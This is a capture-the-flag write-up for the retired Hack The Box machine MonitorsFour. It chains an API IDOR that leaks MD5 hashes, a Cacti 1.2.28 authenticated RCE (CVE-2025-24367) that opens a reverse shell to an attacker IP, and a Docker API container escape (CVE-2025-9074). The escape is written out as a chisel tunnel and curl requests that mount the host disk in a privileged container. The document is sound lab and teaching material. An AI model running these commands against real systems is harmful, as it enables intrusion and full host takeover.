---
machine: MonitorsFour
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, idor, md5, cacti, cve-2025-24367, docker-api, cve-2025-9074]
---

# MonitorsFour — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A Windows host running **Docker Desktop + WSL2**. The site on `monitorsfour.htb` has an **IDOR** in its API (`token=0`) that dumps the user table with unsalted **MD5** hashes: crack the admin's and log into a hidden **Cacti 1.2.28** at `cacti.monitorsfour.htb`. **CVE-2025-24367** gives authenticated RCE and a shell as `www-data` inside the container. From there, the **unauthenticated Docker API** on the WSL2 internal network launches a container with the host disk mounted (**CVE-2025-9074**) and reads the root flag.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
80/tcp    http   nginx (redirects to monitorsfour.htb)
5985/tcp  http   WinRM
```

Only two ports: nginx on Windows means containers. The HTML leaks the mail format (`sales@monitorsfour.htb`) and `/login` rejects default credentials.

```bash
echo "<IP> monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
ffuf -u http://<IP>/ -H "Host: FUZZ.monitorsfour.htb" -w <wordlist> -fs <base_size>
```

```text
cacti   [Status: 200]
```

## IDOR and cracking

```bash
curl -s "http://monitorsfour.htb/api/v1/user?token=0"
```

It returns every user with an unsalted MD5 `password`. `hashcat -m 0` with `rockyou.txt` cracks the administrator's (`marcus`). That password opens the Cacti panel, though the username is the first name rather than `admin`.

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

## Cacti 1.2.28: CVE-2025-24367

With a valid session at `http://cacti.monitorsfour.htb/cacti/`, CVE-2025-24367 injects commands through a graph template. The machine author's own PoC needs valid credentials plus the database credentials (taken from the panel config):

```bash
python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p '<password>' -i <ATTACKER_IP> -l 1337
```

```text
www-data@821fbd6a43fa:~/html/cacti$
```

The shell is **inside a container**; `/proc/1/cgroup` and the absence of Windows users confirm it. The user flag sits in the container or on reachable host storage.

## Escape through the Docker API

The container lives on the WSL2 network and the **Docker API listens with no TLS or auth** on the gateway:

```bash
./chisel client <ATTACKER_IP>:9999 R:2375:192.168.65.7:2375
curl -s http://127.0.0.1:2375/version
```

With the API reachable, create a privileged container with the Windows disk mounted (CVE-2025-9074):

```bash
curl -s -X POST http://127.0.0.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host_root /bin/sh"],
       "HostConfig":{"Binds":["/:/host_root"],"Privileged":true}}'
curl -s -X POST http://127.0.0.1:2375/containers/pwn/start
curl -s -X POST 'http://127.0.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

Inside, `/host_root/Users/Administrator/Desktop/root.txt` is the root flag.

## Lessons

- An IDOR with `token=0` over an API returning MD5 hashes is a full breach: unsalted MD5 is not password storage.
- Reusing the portal password in the monitoring tool turns web access into RCE through a CVE.
- Docker Desktop with the API exposed on the WSL2 network and no auth means the whole host: the container is not a boundary.
- Detection: `/api/v1/user` requests with trivial tokens, container creation from an application IP, and `/` bind mounts in `HostConfig`.
